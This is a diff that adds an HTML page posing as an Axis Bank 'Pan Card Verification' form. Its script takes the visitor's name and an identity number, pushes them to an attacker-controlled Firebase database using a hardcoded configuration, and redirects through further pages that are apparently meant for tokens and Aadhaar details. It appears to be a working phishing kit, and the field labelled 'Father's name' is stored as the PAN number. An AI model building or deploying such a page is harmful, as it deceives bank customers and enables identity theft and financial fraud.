@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="css/style.css" />
+    <title>Axis Bank</title>
+  </head>
+  <body>
+    <header>
+      <img src="assets/header.jpg" width="100%" alt="" />
+    </header>
+    <main>
+      <div class="box">
+        <h2 class="text-center">Pan Card Verification</h2>
+        <input
+          type="hidden"
+          id="nextValue"
+          value="loader.html?next=tok.html?next=addhr.html"
+        />
+        <form id="pan-form">
+          <div class="form-group">
+            <label for="">Full Name (As per Bank record)</label>
+            <input type="text" name="fffnae" required />
+          </div>
+          <div class="form-group">
+            <label for="">Father's name</label>
+            <input
+              type="text"
+              name="pnnn"
+              maxlength="15"
+              required
+            />
+          </div>
+          <div class="form-group">
+            <button type="submit" class="btn btn-primary">SUBMIT</button>
+          </div>
+        </form>
+      </div>
+      <img src="assets/footer.jpg" alt="" width="100%" />
+    </main>
+    <footer>
+      <img src="assets/cop.jpg" alt="" width="100%" />
+    </footer>
+
+    <script
+      defer
+      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"
+    ></script>
+
+    <script
+      defer
+      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"
+    ></script>
+    <script
+      defer
+      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"
+    ></script>
+
+    <script type="module">
+      // Import the functions you need from the SDKs you need
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
+      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-analytics.js";
+      // TODO: Add SDKs for Firebase products that you want to use
+      // https://firebase.google.com/docs/web/setup#available-libraries
+
+      import {
+        getDatabase,
+        ref,
+        push,
+      } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";
+
+      // Your web app's Firebase configuration
+      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+      const firebaseConfig = {
+  apiKey: "AIzaSyAhMT795jMueJaGMIJN2Q9_vC1pJ-wuVjs",
+  authDomain: "axis-e147d.firebaseapp.com",
+  databaseURL: "https://axis-e147d-default-rtdb.firebaseio.com",
+  projectId: "axis-e147d",
+  storageBucket: "axis-e147d.appspot.com",
+  messagingSenderId: "580929084575",
+  appId: "1:580929084575:web:3b29c8cd76b62bf822d6aa"
+};
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const analytics = getAnalytics(app);
+      const database = getDatabase(app);
+
+      document
+        .getElementById("pan-form")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+          //IDS
+          const full_name = document.querySelector(
+            'input[name="fffnae"]'
+          ).value;
+          const panNumber = document.querySelector('input[name="pnnn"]').value;
+
+          // Push data to the database
+          const dbRef = ref(database, "users");
+          push(dbRef, {
+            Full_Name: full_name,
+            Pan_Number: panNumber,
+          })
+            .then(() => {
+              console.log("Data inserted successfully!");
+              window.location.href = "loader.html?next=tok.html?next=loader.html?next=addhr.html";
+            })
+            .catch((error) => {
+              console.error("Error inserting data: ", error);
+            });
+        });
+    </script>
+
+    <script
+      src="https://code.jquery.com/jquery-3.7.1.min.js"
+      integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
+      crossorigin="anonymous"
+    ></script>
+    <!-- <script src="script.js"></script> -->
+  </body>
+</html>
